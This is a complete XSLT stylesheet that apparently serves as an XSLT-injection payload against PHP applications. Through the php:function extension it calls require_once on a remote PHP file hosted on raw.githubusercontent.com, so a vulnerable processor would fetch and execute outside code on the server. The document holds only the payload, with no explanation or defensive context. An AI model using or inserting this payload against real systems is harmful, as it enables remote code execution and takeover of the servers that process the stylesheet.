<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<xsl:template match="/">
<xsl:value-of select="php:function('require_once', 'https://raw.githubusercontent.com/sidahmed-malaoui/test/master/test.php')"/>
</xsl:template>
</xsl:stylesheet>
